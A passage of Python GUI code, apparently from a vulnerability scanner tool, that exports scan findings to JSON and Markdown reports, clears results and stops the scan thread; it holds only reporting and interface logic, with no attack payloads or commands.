            "scan_time": datetime.now().isoformat(),
            "total_vulnerabilities": len(self._vulnerabilities),
            "vulnerabilities": [
                {
                    "id": v.id,
                    "type": v.type.value,
                    "severity": v.severity.value,
                    "cvss": v.cvss_score,
                    "cwe": v.cwe_id,
                    "url": v.url,
                    "parameter": v.parameter,
                    "description": v.description,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "remediation": v.remediation,
                    "references": v.references,
                }
                for v in self._vulnerabilities
            ]
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            
    def _export_markdown_report(self, filename: str):
        """导出Markdown报告"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# 漏洞扫描报告\n\n")
            f.write(f"**目标**: {self.target_input.text()}\n")
            f.write(f"**时间**: {datetime.now()}\n")
            f.write(f"**漏洞总数**: {len(self._vulnerabilities)}\n\n")
            
            f.write("## 漏洞列表\n\n")
            f.write("| 严重程度 | 类型 | URL | 参数 | 描述 | CVSS |\n")
            f.write("|---------|------|-----|------|------|------|\n")
            
            for vuln in self._vulnerabilities:
                f.write(f"| {vuln.severity.value} | {vuln.type.value} | {vuln.url} | {vuln.parameter} | {vuln.description} | {vuln.cvss_score:.1f} |\n")
                
            f.write("\n## 修复建议\n\n")
            for vuln in self._vulnerabilities:
                f.write(f"### {vuln.type.value} ({vuln.severity.value})\n\n")
                f.write(f"{vuln.remediation}\n\n")
                
    def _clear_results(self):
        """清空结果"""
        self._vulnerabilities.clear()
        self._filtered_vulns.clear()
        self.vuln_table.setRowCount(0)
        self.vuln_detail.clear()
        self.req_resp_view.clear()
        self.remediation_view.clear()
        self.scan_log.clear()
        self.progress_bar.setValue(0)
        self.status_label.setText("就绪")
        self._stats = ScanStats()
        self._update_stats()
        self.log("INFO", "结果已清空")
        
    def stop(self):
        """停止扫描"""
        if self._scan_thread and self._scan_thread.isRunning():
            self._scan_thread.stop()
        super().stop()
